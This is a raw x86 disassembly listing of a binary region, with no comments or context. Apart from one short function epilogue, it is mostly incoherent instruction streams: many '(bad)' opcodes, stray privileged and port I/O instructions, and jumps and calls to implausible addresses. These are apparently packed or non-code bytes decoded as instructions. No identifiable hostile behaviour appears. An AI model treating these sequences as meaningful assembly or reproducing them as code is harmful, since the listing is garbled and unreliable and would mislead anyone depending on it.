  40df3e:	xchg   edi,eax
  40df3f:	mov    edx,0x45fe510c
  40df44:	adc    al,0x50
  40df46:	cld    
  40df47:	pop    esp
  40df48:	sub    bl,BYTE PTR [edx-0x1d]
  40df4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df4c:	fwait
  40df4d:	ins    BYTE PTR es:[edi],dx
  40df4e:	in     eax,dx
  40df4f:	or     bh,BYTE PTR [esi+0x6]
  40df52:	adc    ch,BYTE PTR [edi-0x79606ab5]
  40df58:	dec    esp
  40df59:	sub    eax,0x861b9166
  40df5e:	iret   
  40df5f:	pop    ebp
  40df60:	mov    DWORD PTR [ecx],edi
  40df62:	in     al,dx
  40df63:	add    WORD PTR [ecx],cx
  40df66:	sahf   
  40df67:	push   ebx
  40df68:	(bad)  
  40df69:	add    eax,ecx
  40df6b:	pop    edi
  40df6c:	test   DWORD PTR [esi],edi
  40df6e:	aaa    
  40df6f:	int    0xc3
  40df71:	cs (bad) 
  40df73:	inc    ebp
  40df74:	cs pop esp
  40df76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df78:	xor    al,0xea
  40df7a:	cmp    DWORD PTR [ebx+0x55],ecx
  40df7d:	ds or  ebx,ebx
  40df80:	mov    fs,WORD PTR [ebx]
  40df82:	out    0xb5,al
  40df84:	leave  
  40df85:	in     al,0xdd
  40df87:	adc    eax,0x8600f3c
  40df8c:	sbb    eax,0x89c57f4
  40df91:	inc    edx
  40df92:	push   0x6686ed4
  40df97:	jp     0x40e002
  40df99:	int3   
  40df9a:	ss pop ds
  40df9c:	inc    ecx
  40df9d:	stos   BYTE PTR es:[edi],al
  40df9e:	add    DWORD PTR [ebp+0x34],ebp
  40dfa1:	jb     0x40dfc5
  40dfa3:	push   cs
  40dfa4:	leave  
  40dfa5:	inc    esp
  40dfa6:	fild   QWORD PTR [ebx-0x9]
  40dfa9:	ja     0x40df34
  40dfab:	xor    ebx,edx
  40dfad:	mov    bl,0x93
  40dfaf:	pop    ebp
  40dfb0:	adc    DWORD PTR [ebp-0x17],esp
  40dfb3:	xor    DWORD PTR [eax],esi
  40dfb5:	out    0xef,eax
  40dfb7:	jo     0x40df6d
  40dfb9:	inc    ebx
  40dfba:	xchg   ebx,ecx
  40dfbc:	sub    ebx,ecx
  40dfbe:	xchg   ebx,ecx
  40dfc0:	dec    ecx
  40dfc1:	mov    eax,DWORD PTR [ebp-0x1c]
  40dfc4:	imul   eax,ecx
  40dfc7:	add    esp,eax
  40dfc9:	xchg   edx,eax
  40dfca:	push   eax
  40dfcb:	xor    ebx,ebx
  40dfcd:	mov    edx,esp
  40dfcf:	dec    edx
  40dfd0:	inc    ebx
  40dfd1:	add    ebx,DWORD PTR [edx+ebx*1]
  40dfd4:	dec    ebx
  40dfd5:	xor    edx,edx
  40dfd7:	add    DWORD PTR [ebp-0xc],ebx
  40dfda:	pop    ebx
  40dfdb:	mov    eax,DWORD PTR [ebp-0xc]
  40dfde:	pop    edi
  40dfdf:	pop    esi
  40dfe0:	pop    ebx
  40dfe1:	leave  
  40dfe2:	ret    0x10
  40dfe5:	dec    ebp
  40dfe6:	push   ebp
  40dfe7:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40dfed:	mov    esp,ebp
  40dfef:	or     ah,dh
  40dff1:	dec    ebp
  40dff2:	add    bh,al
  40dff4:	add    BYTE PTR [eax],cl
  40dff6:	add    BYTE PTR [eax],al
  40dff8:	mov    DWORD PTR [eax],0x40f44545
  40dffe:	xor    DWORD PTR [eax],eax
  40e000:	test   DWORD PTR [ebx-0x34070b64],ecx
  40e006:	(bad)  
  40e007:	enter  0x4d45,0xbc
  40e00b:	mov    esi,DWORD PTR [edx]
  40e00d:	hlt    
  40e00e:	test   ebx,ecx
  40e010:	pushf  
  40e011:	enter  0x4df8,0x8b
  40e015:	mov    DWORD PTR [ebp-0x20],0x890208
  40e01c:	inc    ebp
  40e01d:	inc    ebp
  40e01e:	cld    
  40e01f:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e025:	or     BYTE PTR [ebx+0x0],dl
  40e028:	mov    ebx,0x8bd5400
  40e02d:	call   DWORD PTR [ecx-0x1]
  40e030:	pop    es
  40e031:	mov    ch,0x33
  40e033:	dec    ebx
  40e035:	(bad)  
  40e036:	mov    eax,0x72009ba4
  40e03b:	push   DWORD PTR [edx]
  40e03d:	or     BYTE PTR [eax],al
  40e03f:	jmp    0xff89:0x75c84d03
  40e046:	dec    ebp
  40e047:	loopne 0x40e019
  40e049:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e04f:	add    BYTE PTR [ebx],dh
  40e051:	mov    ecx,ebx
  40e053:	hlt    
  40e054:	add    ecx,ebx
  40e056:	enter  0x899b,0x32
  40e05a:	dec    ebp
  40e05b:	add    ecx,eax
  40e05d:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e063:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e06a:	xor    ecx,ebx
  40e06c:	retf   
  40e06d:	enter  0x4d03,0xc8
  40e071:	mov    DWORD PTR fs:[eax],ebx
  40e074:	lea    eax,[eax]
  40e076:	push   esp
  40e077:	mov    edi,edi
  40e079:	fs (bad) 
  40e07b:	(bad)  
  40e07c:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e082:	push   0xffffffff
  40e084:	and    bh,bh
  40e086:	pop    ecx
  40e087:	inc    eax
  40e088:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e08e:	push   0xffffff8b
  40e090:	pop    ecx
  40e091:	cld    
  40e092:	dec    ebp
  40e093:	lea    ecx,[ecx+0x45ff08ff]
  40e099:	mov    BYTE PTR [edx+0x1],cl
  40e09c:	add    BYTE PTR [eax],al
  40e09e:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e0a5:	dec    DWORD PTR [ebp-0x77]
  40e0a8:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e0af:	cld    
  40e0b0:	dec    ebp
  40e0b1:	jne    0x40e0e6
  40e0b3:	lea    eax,[ebx]
  40e0b5:	push   eax
  40e0b6:	mov    edi,edi
  40e0b8:	or     BYTE PTR [ecx+0x54a845],cl
  40e0be:	add    al,ch
  40e0c0:	(bad)  
  40e0c1:	sub    esp,ebp
  40e0c3:	add    BYTE PTR [eax],al
  40e0c5:	rol    BYTE PTR [eax],0x84
  40e0c8:	inc    ebp
  40e0c9:	add    dh,BYTE PTR [esi+0x0]
  40e0cc:	add    BYTE PTR [ebp-0x73],al
  40e0cf:	mov    ebp,DWORD PTR [esp+edx*4]
  40e0d2:	inc    DWORD PTR [eax]
  40e0d4:	lea    ecx,[ebx-0x30074f4]
  40e0da:	call   0x41ec5f
  40e0df:	add    BYTE PTR [ebp+0x0],cl
  40e0e2:	jne    0x40e125
  40e0e4:	dec    DWORD PTR [ebx-0x76210314]
  40e0ea:	dec    ebp
  40e0eb:	add    DWORD PTR [ebp+0x0],esi
  40e0ee:	(bad)  
  40e0ef:	xchg   ebp,eax
  40e0f0:	loopne 0x40e0f1
  40e0f2:	inc    eax
  40e0f3:	inc    DWORD PTR [eax]
  40e0f5:	mov    ecx,DWORD PTR [ebp-0x4]
  40e0f8:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e0fe:	add    BYTE PTR [edx],dl
  40e100:	enter  0x4d90,0x0
  40e104:	mov    eax,DWORD PTR [eax]
  40e106:	hlt    
  40e107:	add    al,0xa5
  40e109:	mov    al,0xff
  40e10b:	add    bh,bh
  40e10d:	add    BYTE PTR [ebx],dh
  40e10f:	inc    DWORD PTR [ebx]
  40e111:	sbb    al,0x89
  40e113:	jne    0x40e0ed
  40e115:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e11b:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e121:	mov    DWORD PTR [eax-0x70],0xec58ed89
  40e128:	inc    DWORD PTR [ebp-0x75]
  40e12b:	fisttp QWORD PTR [esi+ebp*8]
  40e12e:	test   DWORD PTR [esi-0x1],esp
  40e131:	inc    ebp
  40e132:	(bad)  
  40e133:	aas    
  40e134:	inc    ebp
  40e135:	(bad)  
  40e136:	lea    edi,[esp+eiz*2-0x1]
  40e13a:	inc    edi
  40e13c:	mov    DWORD PTR ds:0x8000c7a0,edi
  40e142:	mov    ebp,esp
  40e144:	cld    
  40e145:	loop   0x40e0d4
  40e147:	inc    ebp
  40e148:	(bad)  
  40e149:	out    dx,al
  40e14a:	(bad)  
  40e14b:	fisttp WORD PTR [eax+0x8801c7]
  40e151:	jecxz  0x40e198
  40e153:	in     al,dx
  40e154:	inc    DWORD PTR [ebp-0x4]
  40e157:	out    0x8d,eax
  40e159:	aas    
  40e15a:	inc    edi
  40e15c:	jmp    FWORD PTR [eax-0x78]
  40e15f:	inc    DWORD PTR [ecx]
  40e161:	mov    DWORD PTR [eax],0xc7a83d
  40e167:	ins    BYTE PTR es:[edi],dx
  40e168:	test   edi,edi
  40e16a:	pandn  mm0,mm5
  40e16d:	aas    
  40e16e:	add    bh,al
  40e170:	mov    esi,DWORD PTR [eax-0x4]
  40e173:	inc    DWORD PTR [eax+0xdf01ee]
  40e179:	(bad)  
  40e17a:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e17e:	mov    ebp,ebx
  40e180:	xchg   esp,eax
  40e181:	fild   DWORD PTR [eax]
  40e183:	(bad)  
  40e184:	mov    edi,DWORD PTR [eax+0x3]
  40e187:	(bad)  
  40e188:	cmp    al,0xe7
  40e18a:	dec    ebp
  40e18b:	leave  
  40e18c:	mov    ebp,eax
  40e18e:	fsubr  DWORD PTR [ecx]
  40e190:	add    BYTE PTR [eax],al
  40e192:	lea    ecx,[ebx-0x7f0003b4]
  40e198:	push   edx
  40e199:	add    DWORD PTR [ebp+0x0],edx
  40e19c:	mov    esi,DWORD PTR [eax]
  40e19e:	mov    WORD PTR [ebx-0x7a750000],?
  40e1a4:	add    esi,DWORD PTR [ebp-0x78]
  40e1a7:	mov    eax,DWORD PTR [eax]
  40e1a9:	cld    
  40e1aa:	push   0x7d
  40e1ac:	dec    DWORD PTR [ebx+0xd88c]
  40e1b2:	push   edx
  40e1b3:	mov    edx,DWORD PTR [ecx-0x4]
  40e1b6:	call   DWORD PTR [eax+0x7d01fc]
  40e1bc:	mov    ebx,edx
  40e1be:	cld    
  40e1bf:	add    BYTE PTR [eax+0x560150],dl
  40e1c5:	test   DWORD PTR [ebp+0x75],eax
  40e1c8:	loop   0x40e155
  40e1ca:	jmp    0xe38b:0x947dc7fc
  40e1d1:	fsub   st,st(7)
  40e1d3:	add    bh,al
  40e1d5:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e1db:	add    edi,edi
  40e1dd:	add    bh,bh
  40e1df:	mov    eax,0x50e600ed
  40e1e4:	inc    ebp
  40e1e5:	push   esi
  40e1e6:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e1ec:	test   BYTE PTR [ebx],dh
  40e1ee:	out    0x5,al
  40e1f0:	shl    BYTE PTR [edx+0x45],0x0
  40e1f4:	jmp    0x40e1b7
  40e1f6:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  40e1fd:	inc    esi
  40e1fe:	jle    0x40e200
  40e200:	test   edi,eax
  40e202:	jmp    esp
  40e204:	inc    DWORD PTR [eax]
  40e206:	in     eax,dx
  40e207:	add    dh,ah
  40e209:	jne    0x40e190
  40e20b:	mov    edi,edi
  40e20d:	cld    
  40e20e:	inc    DWORD PTR [ebp-0x14]
  40e211:	mov    esp,edx
  40e213:	mov    ah,0x85
  40e215:	add    bh,bh
  40e217:	call   0x1270b1b
  40e21c:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  40e223:	add    ebx,esp
  40e225:	add    ah,ch
  40e227:	xor    BYTE PTR [ebp-0xff00cf],al
  40e22d:	mov    ebx,ebp
  40e22f:	cld    
  40e230:	jle    0x40e1bb
  40e232:	or     DWORD PTR [ecx],eax
  40e234:	add    BYTE PTR [eax],al
  40e236:	push   eax
  40e237:	add    DWORD PTR [ebp+0x45],eax
  40e23a:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e240:	dec    DWORD PTR [ebx-0x3fda0318]
  40e246:	add    BYTE PTR [ebp-0xbf0040],dl
  40e24c:	inc    ebp
  40e24d:	or     BYTE PTR [ebx-0x4faf0400],0x45
  40e254:	add    DWORD PTR [ebx+0x459c00],ecx
  40e25a:	mov    edi,edi
  40e25c:	mov    eax,0xe80800ff
  40e261:	inc    ebp
  40e262:	sub    BYTE PTR [ebx-0x47000400],cl
  40e268:	add    al,0x1
  40e26a:	rol    BYTE PTR [eax],0x1e
  40e26d:	jne    0x40e2b4
  40e26f:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e275:	inc    DWORD PTR [ecx]
  40e277:	call   0x860a7c
  40e27c:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e282:	call   0x410a88
  40e287:	xor    bh,bh
  40e289:	push   edi
  40e28a:	adc    BYTE PTR [ebx-0x747423bb],al
  40e290:	loopne 0x40e26e
  40e292:	ret    
  40e293:	loopne 0x40e230
  40e295:	xor    DWORD PTR [edx],0x31
  40e298:	cmp    edi,edi
  40e29a:	bswap  esp
  40e29c:	rol    BYTE PTR gs:[eax],0x5
  40e2a0:	jmp    0x12be3ea
  40e2a5:	mov    eax,DWORD PTR [ebp-0x4]
  40e2a8:	add    BYTE PTR [eax+0xff0100],bh
  40e2ae:	cld    
  40e2af:	jne    0x40e32e
  40e2b1:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e2b7:	push   ss
  40e2b8:	add    DWORD PTR [eax],eax
  40e2ba:	add    BYTE PTR [eax+0x7f],dl
  40e2bd:	inc    ebp
  40e2be:	add    BYTE PTR [ebx+0x459850],cl
  40e2c4:	mov    edi,edi
  40e2c6:	test   al,0xff
  40e2c8:	add    BYTE PTR [eax],cl
  40e2ca:	inc    DWORD PTR [ebp-0x18]
  40e2cd:	jmp    DWORD PTR ds:0x4d7d00dc
  40e2d3:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e2d9:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e2df:	fwait
  40e2e0:	mov    eax,0x30132
  40e2e5:	lea    esi,[ebp+0x2c]
  40e2e8:	xor    edi,edi
  40e2ea:	(bad)  
  40e2eb:	call   0x1400a58
  40e2f0:	call   0x1350b80
  40e2f5:	jne    0x40e282
  40e2f7:	xor    edi,esp
  40e2f9:	add    eax,DWORD PTR [eax+0xc018d]
  40e2ff:	push   DWORD PTR [eax]
  40e301:	call   0xca0a5d
  40e306:	int3   
  40e307:	inc    DWORD PTR [ebp-0x14]
  40e30a:	mov    ecx,DWORD PTR [ebp-0x28]
  40e30d:	xor    eax,DWORD PTR [eax]
  40e30f:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e315:	(bad)  
  40e316:	xchg   ebp,eax
  40e317:	in     al,0xff
  40e319:	add    bh,bh
  40e31b:	add    BYTE PTR [ebp+0x45],dl
  40e31e:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  40e324:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  40e32b:	mov    edi,edi
  40e32d:	or     BYTE PTR [eax],cl
  40e32f:	inc    ebp
  40e330:	test   DWORD PTR gs:[eax],eax
  40e333:	je     0x40e37a
  40e335:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e33b:	xor    edx,DWORD PTR [eax-0x73]
  40e33e:	push   ebp
  40e33f:	or     BYTE PTR [ebp+0x21007572],al
  40e345:	inc    ebp
  40e346:	in     al,dx
  40e347:	mov    ebp,DWORD PTR [eax]
  40e349:	mov    esp,0x658bc345
  40e34e:	fmul   st,st(5)
  40e350:	add    BYTE PTR [ebx],ch
  40e352:	mov    eax,DWORD PTR [ebx]
  40e354:	cld    
  40e355:	loopne 0x40e317
  40e357:	inc    ebp
  40e358:	push   ebp
  40e359:	cmp    ebp,eax
  40e35b:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e362:	cld    
  40e363:	fadd   DWORD PTR [eax+0x3b014d]
  40e369:	jne    0x40e39b
  40e36b:	push   0xf8898557
  40e370:	in     al,dx
  40e371:	jne    0x40e3b8
  40e373:	lea    eax,[ebx+0x72e8dcc8]
  40e379:	das    
  40e37a:	mov    eax,DWORD PTR [eax]
  40e37c:	mov    esp,0x33eb7545
  40e381:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e387:	xor    eax,edi
  40e389:	adc    DWORD PTR [ebp-0xcd0065],0x8be131
  40e393:	rcl    BYTE PTR [eax-0x40],1
  40e396:	inc    ebp
  40e397:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e39f:	inc    ebp
  40e3a0:	xchg   ebp,eax
  40e3a1:	ud0    ebp,DWORD PTR [ebx]
  40e3a4:	inc    DWORD PTR [eax]
  40e3a6:	retf   
  40e3a7:	jbe    0x40e3a9
  40e3a9:	mov    dl,BYTE PTR [eax-0x80]
  40e3ac:	push   ebp
  40e3ad:	pop    ds
  40e3ae:	mov    ecx,DWORD PTR [esp+esi*8]
  40e3b1:	inc    eax
  40e3b2:	retf   
  40e3b3:	inc    ebp
  40e3b4:	iret   
  40e3b5:	jb     0x40e37f
  40e3b7:	mov    eax,DWORD PTR [edi]
  40e3b9:	enter  0x4545,0x1
  40e3bd:	xor    DWORD PTR [eax],eax
  40e3bf:	pushf  
  40e3c0:	mov    ecx,DWORD PTR [ecx+0x324df0bc]
  40e3c6:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  40e3cd:	dec    ebp
  40e3ce:	add    BYTE PTR [ebx],dh
  40e3d0:	inc    ebp
  40e3d1:	mov    DWORD PTR [ebx-0x3f641b4c],ecx
  40e3d7:	xor    dl,BYTE PTR [edx]
  40e3d9:	add    eax,DWORD PTR [ebp-0x77]
  40e3dc:	mov    eax,esp
  40e3de:	fmul   DWORD PTR [ebp-0x3d]
  40e3e1:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  40e3e8:	mov    DWORD PTR [ebp-0x28],eax
  40e3eb:	rol    DWORD PTR [ebp-0x64],1
  40e3ee:	xor    eax,edi
  40e3f0:	mov    ecx,0xff858db0
  40e3f5:	clc    
  40e3f6:	enter  0x4d45,0x3c
  40e3fa:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e401:	test   esi,edi
  40e403:	clc    
  40e404:	inc    DWORD PTR [ebp+0x45]
  40e407:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e40f:	test   DWORD PTR [ecx],esi
  40e411:	clc    
  40e412:	pushf  
  40e413:	inc    ebp
  40e414:	(bad)  
  40e415:	cmp    ah,bh
  40e417:	pushf  
  40e418:	inc    ebp
  40e419:	mov    edx,DWORD PTR [eax-0x28]
  40e41c:	lock push ebp
  40e41e:	add    BYTE PTR [ebx],dh
  40e420:	mov    DWORD PTR [ebx],eax
  40e422:	sar    BYTE PTR [ebx],1
  40e424:	adc    BYTE PTR [edi],cl
  40e426:	dec    ebp
  40e427:	adc    al,0x8b
  40e429:	add    al,dl
  40e42b:	jmp    0x101e5fb
  40e430:	jb     0x40e47f
  40e432:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e438:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e43b:	xor    ecx,DWORD PTR [edi]
  40e43d:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e441:	(bad)  
  40e443:	clc    
  40e444:	enter  0x8400,0x8b
  40e448:	pop    es
  40e449:	mov    al,0x0
  40e44b:	push   ebp
  40e44c:	push   cs
  40e44d:	xor    ecx,eax
  40e44f:	xor    esp,ecx
  40e451:	add    ebp,DWORD PTR [eax]
  40e453:	add    esi,DWORD PTR [eax]
  40e455:	(bad)  
  40e457:	retf   0x55c8
  40e45a:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e45e:	(bad)  
  40e45f:	cli    
  40e460:	fdivr  st,st(1)
  40e462:	test   DWORD PTR [eax+edi*8],ecx
  40e465:	dec    ebp
  40e466:	inc    ebp
  40e467:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e46d:	add    BYTE PTR [ebp+0x0],al
  40e470:	mov    ecx,DWORD PTR [ebp-0x28]
  40e473:	mov    ecx,ebx
  40e475:	clc    
  40e476:	jne    0x40e443
  40e478:	mov    esi,0xd672d3
  40e47d:	into   
  40e47e:	into   
  40e47f:	scas   eax,DWORD PTR es:[edi]
  40e480:	dec    ebp
  40e481:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e487:	sub    ecx,esi
  40e489:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e48c:	(bad)  
  40e48d:	mov    edi,eax
  40e48f:	mov    al,0x85
  40e491:	mov    eax,edi
  40e493:	add    BYTE PTR [ebp-0x75],al
  40e496:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e49d:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e4a3:	(bad)  
  40e4a5:	retf   0x559c
  40e4a8:	(bad)  
  40e4a9:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e4b0:	inc    ebp
  40e4b1:	add    eax,0xeb9c4d3f
  40e4b6:	(bad)  
  40e4b7:	mov    ecx,esp
  40e4b9:	lods   al,BYTE PTR ds:[esi]
  40e4ba:	test   DWORD PTR [ebp-0x8],edx
  40e4bd:	xor    ecx,DWORD PTR [ebp+0x33]
  40e4c0:	mov    eax,DWORD PTR [ebx]
  40e4c2:	lock add ecx,ebx
  40e4c5:	bswap  esi
  40e4c7:	retf   0x55d1
  40e4ca:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e4d0:	jmp    0x40e4cb
  40e4d2:	add    BYTE PTR ds:0xebc44d8b,al
  40e4d8:	push   ebp
  40e4d9:	mov    ebp,DWORD PTR [ebx]
  40e4db:	test   al,0x8b
  40e4dd:	push   ebp
  40e4de:	clc    
  40e4df:	xor    ecx,ebx
  40e4e1:	xor    ecx,esi
  40e4e3:	add    edx,ecx
  40e4e5:	add    eax,DWORD PTR [edx+0xca010f]
  40e4eb:	push   ebp
  40e4ec:	dec    ebp
  40e4ed:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e4f3:	stc    
  40e4f4:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e4fa:	scas   eax,DWORD PTR es:[edi]
  40e4fb:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e501:	xor    ebp,DWORD PTR [ebx]
  40e503:	xor    edi,DWORD PTR [ebx]
  40e505:	add    esi,DWORD PTR [edi+0x3]
  40e508:	mov    ecx,DWORD PTR [edi]
  40e50a:	clc    
  40e50b:	retf   0x55cb
  40e50e:	into   
  40e50f:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e516:	mov    eax,0x3376554d
  40e51b:	mov    esi,DWORD PTR [ebx]
  40e51d:	int3   
  40e51e:	add    edx,DWORD PTR [ebp+0x3]
  40e521:	xor    ecx,DWORD PTR [edi]
  40e523:	xor    ecx,edx
  40e525:	add    edx,DWORD PTR [ebp+0x3]
  40e528:	mov    ecx,DWORD PTR [edi]
  40e52a:	lock retf 0x4dfa
  40e52e:	stc    
  40e52f:	mov    ecx,DWORD PTR [eax]
  40e531:	or     BYTE PTR [ebp+0x4d],cl
  40e534:	jmp    0x104e5c4
  40e539:	dec    ebp
  40e53a:	dec    ebp
  40e53b:	(bad)  
  40e53c:	mov    ebx,esp
  40e53e:	clc    
  40e53f:	test   ebx,ecx
  40e541:	clc    
  40e542:	ror    DWORD PTR [ebp-0x2a],cl
  40e545:	mov    esi,ecx
  40e547:	call   0x33cc2afb
  40e54c:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e553:	retf   
  40e554:	ja     0x40e524
  40e556:	mov    ebp,DWORD PTR [eax-0x48]
  40e559:	dec    ebp
  40e55a:	xor    ecx,DWORD PTR [di+0x3]
  40e55e:	mov    esp,esp
  40e560:	clc    
  40e561:	push   ebp
  40e562:	retf   
  40e563:	mov    dl,bl
  40e565:	adc    esi,edx
  40e567:	jb     0x40e537
  40e569:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e56f:	call   0x4d6cb0f1
  40e574:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e57a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e57b:	fwait
  40e57c:	inc    ebp
  40e57d:	xor    cl,BYTE PTR [ebp-0x78]
  40e580:	mov    edx,edi
  40e582:	clc    
  40e583:	dec    ebp
  40e584:	retf   
  40e585:	mov    edx,ebx
  40e587:	call   0x560fb962
  40e58c:	scas   eax,DWORD PTR es:[edi]
  40e58d:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40e593:	fwait
  40e594:	sub    esi,DWORD PTR [edx]
  40e596:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e59c:	lods   al,BYTE PTR ds:[esi]
  40e59d:	xor    esp,DWORD PTR [ebx]
  40e59f:	add    ecx,DWORD PTR [ebp-0x1c]
  40e5a2:	mov    edi,DWORD PTR [ebp-0x8]
  40e5a5:	mov    bl,cl
  40e5a7:	cmp    dl,bl
  40e5a9:	jb     0x40e579
  40e5ab:	add    dh,dl
  40e5ad:	dec    ebp
  40e5ae:	scas   eax,DWORD PTR es:[edi]
  40e5af:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e5b5:	shr    DWORD PTR [ebx],cl
  40e5b7:	into   
  40e5b8:	cmp    edx,esi
  40e5ba:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e5c0:	dec    ebp
  40e5c1:	dec    ebp
  40e5c2:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e5c8:	retf   
  40e5c9:	xor    edx,esi
  40e5cb:	add    ecx,esi
  40e5cd:	imul   ecx,edx
  40e5d0:	mov    DWORD PTR [ebp+0x8],edx
  40e5d3:	xor    ecx,DWORD PTR [ebp+0x2b]
  40e5d6:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40e5dc:	add    esi,DWORD PTR [ebx]
  40e5de:	mov    ah,0x3
  40e5e0:	inc    ebp
  40e5e1:	rdtsc  
  40e5e3:	xlat   BYTE PTR ds:[ebx]
  40e5e4:	pushf  
  40e5e5:	jge    0x40e570
  40e5e7:	xor    ebx,eax
  40e5e9:	sub    eax,DWORD PTR [ebp-0x73]
  40e5ec:	(bad)  
  40e5ed:	cmp    al,al
  40e5ef:	jb     0x40e576
  40e5f1:	add    al,bh
  40e5f3:	ror    DWORD PTR [ebp-0x7a],1
  40e5f6:	xor    edi,edi
  40e5f8:	add    edi,edi
  40e5fa:	jmp    0x40e649
  40e5fc:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40e602:	dec    ebp
  40e603:	into   
  40e604:	mov    ebp,DWORD PTR [edi-0x23737428]
  40e60a:	fwait
  40e60b:	shl    DWORD PTR [edx],cl
  40e60d:	retf   0x5588
  40e610:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40e616:	add    eax,DWORD PTR [eax]
  40e618:	in     al,0x4d
  40e61a:	push   ebp
  40e61b:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40e621:	gs add ch,cl
  40e624:	dec    ebp
  40e625:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40e62b:	dec    ebp
  40e62c:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40e632:	jge    0x40e602
  40e634:	mov    BYTE PTR [edi+0xf723b3a],ch
  40e63a:	add    cl,dh
  40e63c:	dec    ebp
  40e63d:	dec    DWORD PTR [ebx-0x2c032375]
  40e643:	adc    BYTE PTR [ebp+0x1],0x8b
  40e647:	add    al,bl
  40e649:	jge    0x40e5d7
  40e64b:	push   0xffffff9b
  40e64d:	push   0x8b3032
  40e652:	shl    BYTE PTR [ebp+0x55],0x6a
  40e656:	xor    edi,edi
  40e658:	xor    edx,DWORD PTR [ebx+eax*1]
  40e65b:	inc    ebp
  40e65c:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40e662:	dec    ebp
  40e663:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40e669:	jbe    0x40e5f6
  40e66b:	mov    ebp,esp
  40e66d:	ror    bl,1
  40e66f:	enter  0x14ce,0xaf
  40e673:	dec    DWORD PTR [ebx-0x2cef17f8]
  40e679:	push   ebp
  40e67a:	retf   0x5540
  40e67d:	push   ebp
  40e67e:	mov    esi,DWORD PTR [edx-0x1c]
  40e681:	mov    edx,ebx
  40e683:	cld    
  40e684:	(bad)  
  40e685:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40e68c:	sti    
  40e68d:	add    dh,cl
  40e68f:	push   0xffffff94
  40e691:	call   FWORD PTR [ebx+0x3b5032d0]
  40e697:	mov    ecx,DWORD PTR [edi]
  40e699:	int3   
  40e69a:	pop    esi
  40e69b:	inc    ebp
  40e69c:	dec    DWORD PTR [ecx+0x45e8c88b]
  40e6a2:	push   ebp
  40e6a3:	xor    esi,DWORD PTR [ebx]
  40e6a5:	mov    DWORD PTR [ebx],0xcace0f9c
  40e6ab:	aas    
  40e6ac:	push   ebp
  40e6ad:	inc    ebp
  40e6ae:	xor    edx,esi
  40e6b0:	add    edx,esi
  40e6b2:	mov    eax,DWORD PTR [ebx]
  40e6b4:	(bad)  
  40e6b5:	jmp    0x40e643
  40e6b7:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  40e6bd:	rol    ah,1
  40e6bf:	mov    esi,0xf133104d
  40e6c4:	mov    edx,0xff388d80
  40e6c9:	mov    dh,0xd1
  40e6cb:	cmp    edx,DWORD PTR [ebp+0xf]
